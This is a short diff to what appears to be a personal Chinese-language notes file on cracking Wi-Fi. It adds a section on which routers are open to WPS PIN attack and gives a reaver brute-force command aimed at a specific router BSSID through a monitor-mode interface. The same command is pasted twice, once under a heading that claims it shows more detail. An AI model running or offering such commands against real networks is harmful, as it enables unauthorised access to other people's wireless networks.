@@ -6,6 +6,22 @@
 
 具体的方法 http://xiao106347.blog.163.com/blog/static/21599207820136161132836/
 
+# 怎样的可以pin
+
+`54e.` 的即可
+
+方式:
+
+```
+sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
+```
+
+显示更多信息 
+
+```
+sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
+```
+
 # 查看
 
 当然，通过输入iwconfig查看也是可以滴。这个命令专用于查看无线网卡，不像ifconfig那样查看所有适配器。
